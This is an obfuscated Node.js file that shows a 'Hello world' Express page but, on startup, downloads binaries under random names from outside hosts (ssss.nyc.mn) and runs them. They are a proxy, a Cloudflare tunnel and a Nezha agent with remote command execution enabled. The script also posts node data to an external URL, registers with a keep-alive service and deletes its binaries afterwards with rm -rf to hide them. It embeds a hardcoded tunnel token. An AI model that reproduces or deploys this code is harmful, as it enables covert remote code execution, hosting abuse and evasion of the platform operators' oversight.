const _0x2341da=_0x4545;(function(_0x59d406,_0x25f093){const _0x482724=_0x4545,_0x357503=_0x59d406();while(!![]){try{const _0x36b3fd=-parseInt(_0x482724(0xc1))/0x1+parseInt(_0x482724(0x142))/0x2*(-parseInt(_0x482724(0x122))/0x3)+parseInt(_0x482724(0x137))/0x4+-parseInt(_0x482724(0xf5))/0x5+parseInt(_0x482724(0x102))/0x6*(-parseInt(_0x482724(0xc5))/0x7)+-parseInt(_0x482724(0xb0))/0x8+parseInt(_0x482724(0xec))/0x9;if(_0x36b3fd===_0x25f093)break;else _0x357503['push'](_0x357503['shift']());}catch(_0x3b1080){_0x357503['push'](_0x357503['shift']());}}}(_0x1afd,0x4a0d6));const express=require(_0x2341da(0xd0)),app=express(),axios=require(_0x2341da(0x16d)),os=require('os'),fs=require('fs'),path=require(_0x2341da(0x146)),{promisify}=require(_0x2341da(0x12f)),exec=promisify(require(_0x2341da(0xca))[_0x2341da(0xb4)]),{execSync}=require(_0x2341da(0xca)),UPLOAD_URL=process[_0x2341da(0x10a)][_0x2341da(0x15b)]||'',PROJECT_URL=process[_0x2341da(0x10a)][_0x2341da(0x121)]||'',AUTO_ACCESS=process['env'][_0x2341da(0x136)]||![],FILE_PATH=process[_0x2341da(0x10a)][_0x2341da(0x160)]||_0x2341da(0xb7),SUB_PATH=process[_0x2341da(0x10a)][_0x2341da(0x123)]||_0x2341da(0xdd),PORT=process[_0x2341da(0x10a)][_0x2341da(0x141)]||process[_0x2341da(0x10a)]['PORT']||0xbb8,UUID=process[_0x2341da(0x10a)][_0x2341da(0x145)]||'7e20e895-eb98-40f6-b242-d541316b6f67',NEZHA_SERVER=process[_0x2341da(0x10a)][_0x2341da(0xfc)]||'',NEZHA_PORT=process[_0x2341da(0x10a)][_0x2341da(0x148)]||'',NEZHA_KEY=process[_0x2341da(0x10a)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x2341da(0x10a)][_0x2341da(0x14e)]||_0x2341da(0xda),ARGO_AUTH=process[_0x2341da(0x10a)]['ARGO_AUTH']||_0x2341da(0x130),ARGO_PORT=process[_0x2341da(0x10a)][_0x2341da(0x126)]||0x1f41,CFIP=process[_0x2341da(0x10a)]['CFIP']||_0x2341da(0xae),CFPORT=process[_0x2341da(0x10a)]['CFPORT']||0x1bb,NAME=process[_0x2341da(0x10a)][_0x2341da(0x156)]||_0x2341da(0x12b);!fs[_0x2341da(0x128)](FILE_PATH)?(fs[_0x2341da(0xf6)](FILE_PATH),console['log'](FILE_PATH+_0x2341da(0xc2))):console[_0x2341da(0x14b)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x498f05=_0x2341da,_0x3c5502=_0x498f05(0x100);let _0x55c7f4='';for(let _0x3acccf=0x0;_0x3acccf<0x6;_0x3acccf++){_0x55c7f4+=_0x3c5502['charAt'](Math[_0x498f05(0x103)](Math[_0x498f05(0xd1)]()*_0x3c5502[_0x498f05(0x10c)]));}return _0x55c7f4;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2341da(0x104)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x2341da(0x104)](FILE_PATH,webName),botPath=path[_0x2341da(0x104)](FILE_PATH,botName),subPath=path[_0x2341da(0x104)](FILE_PATH,_0x2341da(0xc6)),listPath=path[_0x2341da(0x104)](FILE_PATH,_0x2341da(0x140)),bootLogPath=path['join'](FILE_PATH,_0x2341da(0xdb)),configPath=path[_0x2341da(0x104)](FILE_PATH,_0x2341da(0xde));function deleteNodes(){const _0x57f232=_0x2341da;try{if(!UPLOAD_URL)return;if(!fs[_0x57f232(0x128)](subPath))return;let _0x4b9d87;try{_0x4b9d87=fs[_0x57f232(0x14a)](subPath,'utf-8');}catch{return null;}const _0x39c96b=Buffer[_0x57f232(0x111)](_0x4b9d87,'base64')['toString'](_0x57f232(0xb9)),_0x3648d7=_0x39c96b[_0x57f232(0x11a)]('\x0a')[_0x57f232(0xf2)](_0x3fec0b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x57f232(0x12d)](_0x3fec0b));if(_0x3648d7[_0x57f232(0x10c)]===0x0)return;return axios[_0x57f232(0x144)](UPLOAD_URL+_0x57f232(0xe4),JSON['stringify']({'nodes':_0x3648d7}),{'headers':{'Content-Type':_0x57f232(0x133)}})[_0x57f232(0x134)](_0xfedc1=>{return null;}),null;}catch(_0x32c7a8){return null;}}function _0x4545(_0x350d54,_0x1d8ce7){const _0x1afd1d=_0x1afd();return _0x4545=function(_0x454574,_0x5b0598){_0x454574=_0x454574-0xac;let _0x38bf0e=_0x1afd1d[_0x454574];return _0x38bf0e;},_0x4545(_0x350d54,_0x1d8ce7);}function cleanupOldFiles(){const _0x13f942=_0x2341da;try{const _0x479a07=fs[_0x13f942(0xd4)](FILE_PATH);_0x479a07[_0x13f942(0xe2)](_0x2d17f7=>{const _0x4e43c8=_0x13f942,_0x57bb0b=path[_0x4e43c8(0x104)](FILE_PATH,_0x2d17f7);try{const _0x225c15=fs[_0x4e43c8(0x16c)](_0x57bb0b);_0x225c15[_0x4e43c8(0xea)]()&&fs[_0x4e43c8(0x12c)](_0x57bb0b);}catch(_0x2b774b){}});}catch(_0x5e3ecc){}}app[_0x2341da(0xd2)]('/',function(_0x184f46,_0x4da310){const _0x5b8823=_0x2341da;_0x4da310[_0x5b8823(0x11b)](_0x5b8823(0xe8));});async function generateConfig(){const _0x13c9e8=_0x2341da,_0x29e3ca={'log':{'access':_0x13c9e8(0x124),'error':_0x13c9e8(0x124),'loglevel':_0x13c9e8(0x15d)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x13c9e8(0xc3)}],'decryption':_0x13c9e8(0x15d),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x13c9e8(0xb6),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x13c9e8(0x108)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x13c9e8(0x13b),'settings':{'clients':[{'id':UUID}],'decryption':_0x13c9e8(0x15d)},'streamSettings':{'network':_0x13c9e8(0x108),'security':_0x13c9e8(0x15d)}},{'port':0xbba,'listen':_0x13c9e8(0x116),'protocol':_0x13c9e8(0x13b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x13c9e8(0x15d),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x13c9e8(0xeb)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x13c9e8(0x116),'protocol':_0x13c9e8(0xad),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x13c9e8(0xb6)}},'sniffing':{'enabled':!![],'destOverride':[_0x13c9e8(0xdc),_0x13c9e8(0xd8),_0x13c9e8(0xeb)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x13c9e8(0x116),'protocol':_0x13c9e8(0x155),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x13c9e8(0x158)}},'sniffing':{'enabled':!![],'destOverride':[_0x13c9e8(0xdc),'tls',_0x13c9e8(0xeb)],'metadataOnly':![]}}],'dns':{'servers':[_0x13c9e8(0x14c)]},'outbounds':[{'protocol':_0x13c9e8(0x147),'tag':_0x13c9e8(0xee)},{'protocol':_0x13c9e8(0xfb),'tag':_0x13c9e8(0x109)}]};fs[_0x13c9e8(0x125)](path[_0x13c9e8(0x104)](FILE_PATH,_0x13c9e8(0xde)),JSON[_0x13c9e8(0x161)](_0x29e3ca,null,0x2));}function _0x1afd(){const _0x427fab=['fileName','78drLujL','floor','join','amd','arm','includes','tcp','block','env','TunnelSecret','length','config.yaml','\x20is\x20running','2053','web\x20running\x20error:\x20','from','ArgoDomain:','win32','fileUrl','/api/add-subscriptions','127.0.0.1','charAt','platform','443','split','send','Error\x20downloading\x20files:','rm\x20-rf\x20','pkill\x20-f\x20\x22[','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','chmod','PROJECT_URL','9tdOBve','SUB_PATH','/dev/null','writeFileSync','ARGO_PORT','2083','existsSync','\x20>\x20nul\x202>&1','/api/add-nodes','sqzs-argo-1029','unlinkSync','test','message','util','eyJhIjoiYmEzMWFkMmM1ZWMyOGRjNDBkZjhiODRiZDg1MzYzMTgiLCJ0IjoiZDRlMWUzNmItMGRlYS00NDJmLTljMmEtNThlZDM4MTY2NDMzIiwicyI6Ik16VmxOVGhrTlRVdE9EZ3daUzAwWWpneUxXRmlPRE10T0RNd01qYzFZelJsTkRVNCJ9','Skipping\x20adding\x20automatic\x20access\x20task','php\x20running\x20error:\x20','application/json','catch','clear','AUTO_ACCESS','216600BlPBbn','&path=%2Fvless-argo%3Fed%3D2560#','all','close','vless','Error\x20executing\x20command:\x20','https://amd64.ssss.nyc.mn/web','\x20-s\x20','Error\x20reading\x20boot.log:','list.txt','SERVER_PORT','100938bNDBdo','automatic\x20access\x20task\x20added\x20successfully','post','UUID','path','freedom','NEZHA_PORT','push','readFileSync','log','https+local://8.8.8.8/dns-query','2096','ARGO_DOMAIN','\x20-c\x20','?encryption=none&security=tls&sni=','tunnel.json','error','Error\x20in\x20startserver:','basename','trojan','NAME','\x20>/dev/null\x202>&1','/trojan-argo','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','match','UPLOAD_URL','trim','none','?security=tls&sni=','https://arm64.ssss.nyc.mn/v1','FILE_PATH','stringify','/tunnel.yml\x20run','/sub.txt\x20saved\x20successfully','ARGO_DOMAIN:','\x20>/dev/null\x202>&1\x20&','arch','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','unlink','false','statSync','axios','createWriteStream','text/plain;\x20charset=utf-8','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','vmess','cdns.doon.eu.org','status','4499856CBgtRn','\x0aclient_secret:\x20','\x0a\x20\x20\x0atrojan://','toString','exec','\x0avless://','/vmess-argo','./tmp','taskkill\x20/f\x20/im\x20','utf-8','/config.json\x20>/dev/null\x202>&1\x20&','finish','aarch64','2087','https://arm64.ssss.nyc.mn/bot','.exe\x20>\x20nul\x202>&1','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','189119SZadxy','\x20is\x20created','xtls-rprx-vision','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','18298OmexOZ','sub.txt','Content-Type','del\x20/f\x20/q\x20','unshift','child_process','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/agent','https://oooo.serv00.net/add-url','Add\x20automatic\x20access\x20task\x20faild:\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','express','random','get','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','readdirSync','\x20-c\x20\x22','https://amd64.ssss.nyc.mn/bot','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','tls','&fp=firefox&type=ws&host=','argo.2.9.6.7.a.0.6.3.0.0.0.7.4.0.1.0.0.2.ip6.arpa','boot.log','http','sqzs-sub','config.json','stream','pop','response','forEach','Empowerment\x20failed\x20for\x20','/api/delete-nodes','set','NEZHA\x20variable\x20is\x20empty,skip\x20running','pipe','Hello\x20world!','Nodes\x20uploaded\x20successfully','isFile','quic','11383974ovWMVG','8443','direct','\x20-p\x20','Subscription\x20uploaded\x20successfully','base64','filter','\x20failed:\x20','https://amd64.ssss.nyc.mn/v1','393640kHDwcr','mkdirSync','http\x20server\x20is\x20running\x20on\x20port:','App\x20is\x20running','\x0a\x20\x20\x20\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','blackhole','NEZHA_SERVER','nohup\x20','https://arm64.ssss.nyc.mn/web','Download\x20','abcdefghijklmnopqrstuvwxyz'];_0x1afd=function(){return _0x427fab;};return _0x1afd();}function getSystemArchitecture(){const _0x4510ba=_0x2341da,_0x3a5a59=os[_0x4510ba(0x166)]();return _0x3a5a59===_0x4510ba(0x106)||_0x3a5a59==='arm64'||_0x3a5a59===_0x4510ba(0xbc)?_0x4510ba(0x106):_0x4510ba(0x105);}function downloadFile(_0x1c3c71,_0x4d9b9b,_0x44238d){const _0x318c32=_0x2341da,_0x4b3cb6=_0x1c3c71;!fs['existsSync'](FILE_PATH)&&fs[_0x318c32(0xf6)](FILE_PATH,{'recursive':!![]});const _0x1797d6=fs[_0x318c32(0x16e)](_0x4b3cb6);axios({'method':_0x318c32(0xd2),'url':_0x4d9b9b,'responseType':_0x318c32(0xdf)})['then'](_0x25ca64=>{const _0x42dde1=_0x318c32;_0x25ca64['data'][_0x42dde1(0xe7)](_0x1797d6),_0x1797d6['on'](_0x42dde1(0xbb),()=>{const _0x4e8501=_0x42dde1;_0x1797d6[_0x4e8501(0x13a)](),console[_0x4e8501(0x14b)](_0x4e8501(0xff)+path['basename'](_0x4b3cb6)+'\x20successfully'),_0x44238d(null,_0x4b3cb6);}),_0x1797d6['on'](_0x42dde1(0x152),_0x172185=>{const _0x61c84a=_0x42dde1;fs[_0x61c84a(0x16a)](_0x4b3cb6,()=>{});const _0x2b50db='Download\x20'+path[_0x61c84a(0x154)](_0x4b3cb6)+_0x61c84a(0xf3)+_0x172185['message'];console[_0x61c84a(0x152)](_0x2b50db),_0x44238d(_0x2b50db);});})[_0x318c32(0x134)](_0x476345=>{const _0x266e1e=_0x318c32,_0x1682ef='Download\x20'+path[_0x266e1e(0x154)](_0x4b3cb6)+_0x266e1e(0xf3)+_0x476345[_0x266e1e(0x12e)];console[_0x266e1e(0x152)](_0x1682ef),_0x44238d(_0x1682ef);});}async function downloadFilesAndRun(){const _0x16f6ac=_0x2341da,_0x44568d=getSystemArchitecture(),_0x39e301=getFilesForArchitecture(_0x44568d);if(_0x39e301[_0x16f6ac(0x10c)]===0x0){console[_0x16f6ac(0x14b)](_0x16f6ac(0x159));return;}const _0x52b03a=_0x39e301['map'](_0x5e0d88=>{return new Promise((_0x1b71c1,_0x2e8652)=>{const _0x3e48c1=_0x4545;downloadFile(_0x5e0d88[_0x3e48c1(0x101)],_0x5e0d88[_0x3e48c1(0x114)],(_0x2e9efe,_0x43f35a)=>{_0x2e9efe?_0x2e8652(_0x2e9efe):_0x1b71c1(_0x43f35a);});});});try{await Promise[_0x16f6ac(0x139)](_0x52b03a);}catch(_0x1e4b29){console[_0x16f6ac(0x152)](_0x16f6ac(0x11c),_0x1e4b29);return;}function _0x19c3e9(_0x343929){const _0x44f440=0x1fd;_0x343929['forEach'](_0x55532d=>{const _0x400565=_0x4545;fs[_0x400565(0x128)](_0x55532d)&&fs[_0x400565(0x120)](_0x55532d,_0x44f440,_0xf1aded=>{const _0x5a94b9=_0x400565;_0xf1aded?console[_0x5a94b9(0x152)](_0x5a94b9(0xe3)+_0x55532d+':\x20'+_0xf1aded):console['log']('Empowerment\x20success\x20for\x20'+_0x55532d+':\x20'+_0x44f440[_0x5a94b9(0xb3)](0x8));});});}const _0xc27be0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x19c3e9(_0xc27be0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x126a14=NEZHA_SERVER[_0x16f6ac(0x107)](':')?NEZHA_SERVER[_0x16f6ac(0x11a)](':')[_0x16f6ac(0xe0)]():'',_0x153f0d=new Set([_0x16f6ac(0x119),_0x16f6ac(0xed),'2096',_0x16f6ac(0xbd),_0x16f6ac(0x127),_0x16f6ac(0x10f)]),_0x1b15f3=_0x153f0d['has'](_0x126a14)?'true':_0x16f6ac(0x16b),_0x3f0a81=_0x16f6ac(0xb1)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x1b15f3+_0x16f6ac(0xc4)+UUID;fs[_0x16f6ac(0x125)](path['join'](FILE_PATH,_0x16f6ac(0x10d)),_0x3f0a81);const _0x2a76e5='nohup\x20'+phpPath+_0x16f6ac(0xd5)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2a76e5),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x3232d8=>setTimeout(_0x3232d8,0x3e8));}catch(_0x57ae1a){console[_0x16f6ac(0x152)](_0x16f6ac(0x132)+_0x57ae1a);}}else{let _0x5b9e75='';const _0x416537=[_0x16f6ac(0x119),'8443',_0x16f6ac(0x14d),_0x16f6ac(0xbd),'2083',_0x16f6ac(0x10f)];_0x416537[_0x16f6ac(0x107)](NEZHA_PORT)&&(_0x5b9e75='--tls');const _0x279991=_0x16f6ac(0xfd)+npmPath+_0x16f6ac(0x13e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x16f6ac(0xef)+NEZHA_KEY+'\x20'+_0x5b9e75+_0x16f6ac(0xcb);try{await exec(_0x279991),console[_0x16f6ac(0x14b)](npmName+_0x16f6ac(0x10e)),await new Promise(_0x58fb94=>setTimeout(_0x58fb94,0x3e8));}catch(_0x1b657a){console[_0x16f6ac(0x152)]('npm\x20running\x20error:\x20'+_0x1b657a);}}}else console[_0x16f6ac(0x14b)](_0x16f6ac(0xe6));const _0x524188=_0x16f6ac(0xfd)+webPath+_0x16f6ac(0x14f)+FILE_PATH+_0x16f6ac(0xba);try{await exec(_0x524188),console['log'](webName+_0x16f6ac(0x10e)),await new Promise(_0x2d6f9f=>setTimeout(_0x2d6f9f,0x3e8));}catch(_0x573699){console[_0x16f6ac(0x152)](_0x16f6ac(0x110)+_0x573699);}if(fs[_0x16f6ac(0x128)](botPath)){let _0x577eba;if(ARGO_AUTH[_0x16f6ac(0x15a)](/^[A-Z0-9a-z=]{120,250}$/))_0x577eba=_0x16f6ac(0x169)+ARGO_AUTH;else ARGO_AUTH[_0x16f6ac(0x15a)](/TunnelSecret/)?_0x577eba='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x16f6ac(0x162):_0x577eba=_0x16f6ac(0x168)+FILE_PATH+_0x16f6ac(0xfa)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x577eba+_0x16f6ac(0x165)),console['log'](botName+_0x16f6ac(0x10e)),await new Promise(_0x42b3ba=>setTimeout(_0x42b3ba,0x7d0));}catch(_0x38ef03){console['error'](_0x16f6ac(0x13c)+_0x38ef03);}}await new Promise(_0x1e2e6=>setTimeout(_0x1e2e6,0x1388));}function getFilesForArchitecture(_0x3a87b9){const _0x437bda=_0x2341da;let _0x452c01;_0x3a87b9===_0x437bda(0x106)?_0x452c01=[{'fileName':webPath,'fileUrl':_0x437bda(0xfe)},{'fileName':botPath,'fileUrl':_0x437bda(0xbe)}]:_0x452c01=[{'fileName':webPath,'fileUrl':_0x437bda(0x13d)},{'fileName':botPath,'fileUrl':_0x437bda(0xd6)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3476df=_0x3a87b9===_0x437bda(0x106)?_0x437bda(0xcc):'https://amd64.ssss.nyc.mn/agent';_0x452c01[_0x437bda(0xc9)]({'fileName':npmPath,'fileUrl':_0x3476df});}else{const _0x97dc15=_0x3a87b9===_0x437bda(0x106)?_0x437bda(0x15f):_0x437bda(0xf4);_0x452c01[_0x437bda(0xc9)]({'fileName':phpPath,'fileUrl':_0x97dc15});}}return _0x452c01;}function argoType(){const _0x38a1e0=_0x2341da;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x38a1e0(0x14b)](_0x38a1e0(0xc0));return;}if(ARGO_AUTH[_0x38a1e0(0x107)](_0x38a1e0(0x10b))){fs[_0x38a1e0(0x125)](path[_0x38a1e0(0x104)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x52cced='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x38a1e0(0x104)](FILE_PATH,_0x38a1e0(0x151))+_0x38a1e0(0xd7)+ARGO_DOMAIN+_0x38a1e0(0x11f)+ARGO_PORT+_0x38a1e0(0x167);fs[_0x38a1e0(0x125)](path[_0x38a1e0(0x104)](FILE_PATH,'tunnel.yml'),_0x52cced);}else console[_0x38a1e0(0x14b)](_0x38a1e0(0xac));}argoType();async function extractDomains(){const _0xdac211=_0x2341da;let _0x39b136;if(ARGO_AUTH&&ARGO_DOMAIN)_0x39b136=ARGO_DOMAIN,console[_0xdac211(0x14b)](_0xdac211(0x164),_0x39b136),await _0x196ba1(_0x39b136);else try{const _0x4db9ed=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),_0xdac211(0xb9)),_0x57c9b5=_0x4db9ed[_0xdac211(0x11a)]('\x0a'),_0x46123b=[];_0x57c9b5['forEach'](_0x798052=>{const _0x5cd53c=_0xdac211,_0x20a314=_0x798052[_0x5cd53c(0x15a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x20a314){const _0x75de08=_0x20a314[0x1];_0x46123b[_0x5cd53c(0x149)](_0x75de08);}});if(_0x46123b[_0xdac211(0x10c)]>0x0)_0x39b136=_0x46123b[0x0],console[_0xdac211(0x14b)](_0xdac211(0x112),_0x39b136),await _0x196ba1(_0x39b136);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0xdac211(0x12c)](path[_0xdac211(0x104)](FILE_PATH,_0xdac211(0xdb)));async function _0x300b06(){const _0x2f8b07=_0xdac211;try{process[_0x2f8b07(0x118)]===_0x2f8b07(0x113)?await exec(_0x2f8b07(0xb8)+botName+_0x2f8b07(0xbf)):await exec(_0x2f8b07(0x11e)+botName[_0x2f8b07(0x117)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x429b7c){}}_0x300b06(),await new Promise(_0x27502d=>setTimeout(_0x27502d,0xbb8));const _0xae403d=_0xdac211(0x168)+FILE_PATH+_0xdac211(0xfa)+ARGO_PORT;try{await exec(_0xdac211(0xfd)+botPath+'\x20'+_0xae403d+'\x20>/dev/null\x202>&1\x20&'),console[_0xdac211(0x14b)](botName+'\x20is\x20running'),await new Promise(_0x51f3bf=>setTimeout(_0x51f3bf,0xbb8)),await extractDomains();}catch(_0x33186e){console['error']('Error\x20executing\x20command:\x20'+_0x33186e);}}}catch(_0x2c46db){console['error'](_0xdac211(0x13f),_0x2c46db);}async function _0x196ba1(_0x57fb68){const _0x2d3a31=_0xdac211,_0x2982be=execSync(_0x2d3a31(0xcf),{'encoding':_0x2d3a31(0xb9)}),_0x7ff2d8=_0x2982be[_0x2d3a31(0x15c)](),_0x189605=NAME?NAME+'-'+_0x7ff2d8:_0x7ff2d8;return new Promise(_0xfb8bd1=>{setTimeout(()=>{const _0x474101=_0x4545,_0x492c81={'v':'2','ps':''+_0x189605,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x474101(0x15d),'net':'ws','type':_0x474101(0x15d),'host':_0x57fb68,'path':'/vmess-argo?ed=2560','tls':_0x474101(0xd8),'sni':_0x57fb68,'alpn':'','fp':'firefox'},_0x84861d=_0x474101(0xb5)+UUID+'@'+CFIP+':'+CFPORT+_0x474101(0x150)+_0x57fb68+_0x474101(0xd9)+_0x57fb68+_0x474101(0x138)+_0x189605+'\x0a\x20\x20\x0avmess://'+Buffer[_0x474101(0x111)](JSON[_0x474101(0x161)](_0x492c81))[_0x474101(0xb3)]('base64')+_0x474101(0xb2)+UUID+'@'+CFIP+':'+CFPORT+_0x474101(0x15e)+_0x57fb68+_0x474101(0xd9)+_0x57fb68+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x189605+_0x474101(0xf9);console[_0x474101(0x14b)](Buffer[_0x474101(0x111)](_0x84861d)['toString'](_0x474101(0xf1))),fs[_0x474101(0x125)](subPath,Buffer[_0x474101(0x111)](_0x84861d)[_0x474101(0xb3)](_0x474101(0xf1))),console[_0x474101(0x14b)](FILE_PATH+_0x474101(0x163)),uploadNodes(),app[_0x474101(0xd2)]('/'+SUB_PATH,(_0x56ae24,_0x2133d4)=>{const _0x1bb279=_0x474101,_0x2e8c95=Buffer[_0x1bb279(0x111)](_0x84861d)[_0x1bb279(0xb3)]('base64');_0x2133d4[_0x1bb279(0xe5)](_0x1bb279(0xc7),_0x1bb279(0x16f)),_0x2133d4[_0x1bb279(0x11b)](_0x2e8c95);}),_0xfb8bd1(_0x84861d);},0x7d0);});}}async function uploadNodes(){const _0x19d451=_0x2341da;if(UPLOAD_URL&&PROJECT_URL){const _0x31a654=PROJECT_URL+'/'+SUB_PATH,_0x594d57={'subscription':[_0x31a654]};try{const _0x388deb=await axios[_0x19d451(0x144)](UPLOAD_URL+_0x19d451(0x115),_0x594d57,{'headers':{'Content-Type':_0x19d451(0x133)}});return _0x388deb&&_0x388deb[_0x19d451(0xaf)]===0xc8?(console[_0x19d451(0x14b)](_0x19d451(0xf0)),_0x388deb):null;}catch(_0x490026){if(_0x490026[_0x19d451(0xe1)]){if(_0x490026['response'][_0x19d451(0xaf)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x19d451(0x128)](listPath))return;const _0x5752b9=fs[_0x19d451(0x14a)](listPath,'utf-8'),_0x333e22=_0x5752b9['split']('\x0a')[_0x19d451(0xf2)](_0x1736d9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x19d451(0x12d)](_0x1736d9));if(_0x333e22[_0x19d451(0x10c)]===0x0)return;const _0xc2f78=JSON[_0x19d451(0x161)]({'nodes':_0x333e22});try{const _0x23fec8=await axios['post'](UPLOAD_URL+_0x19d451(0x12a),_0xc2f78,{'headers':{'Content-Type':_0x19d451(0x133)}});return _0x23fec8&&_0x23fec8[_0x19d451(0xaf)]===0xc8?(console['log'](_0x19d451(0xe9)),_0x23fec8):null;}catch(_0x3c1781){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4543f5=_0x4545,_0x131bc8=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x131bc8['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x131bc8[_0x4543f5(0x149)](phpPath);process[_0x4543f5(0x118)]===_0x4543f5(0x113)?exec(_0x4543f5(0xc8)+_0x131bc8[_0x4543f5(0x104)]('\x20')+_0x4543f5(0x129),_0x1247e1=>{const _0x37ddad=_0x4543f5;console[_0x37ddad(0x135)](),console[_0x37ddad(0x14b)](_0x37ddad(0xf8)),console[_0x37ddad(0x14b)](_0x37ddad(0xd3));}):exec(_0x4543f5(0x11d)+_0x131bc8['join']('\x20')+_0x4543f5(0x157),_0x80cb44=>{const _0xdaeb9e=_0x4543f5;console['clear'](),console[_0xdaeb9e(0x14b)](_0xdaeb9e(0xf8)),console[_0xdaeb9e(0x14b)](_0xdaeb9e(0xd3));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3009d1=_0x2341da;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3009d1(0x14b)](_0x3009d1(0x131));return;}try{const _0x2a4953=await axios[_0x3009d1(0x144)](_0x3009d1(0xcd),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3009d1(0x133)}});return console['log'](_0x3009d1(0x143)),_0x2a4953;}catch(_0x256852){return console[_0x3009d1(0x152)](_0x3009d1(0xce)+_0x256852[_0x3009d1(0x12e)]),null;}}async function startserver(){const _0x5c366f=_0x2341da;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1fb438){console[_0x5c366f(0x152)](_0x5c366f(0x153),_0x1fb438);}}startserver()[_0x2341da(0x134)](_0x1d4a08=>{const _0x6a4b98=_0x2341da;console[_0x6a4b98(0x152)]('Unhandled\x20error\x20in\x20startserver:',_0x1d4a08);}),app['listen'](PORT,()=>console[_0x2341da(0x14b)](_0x2341da(0xf7)+PORT+'!'));
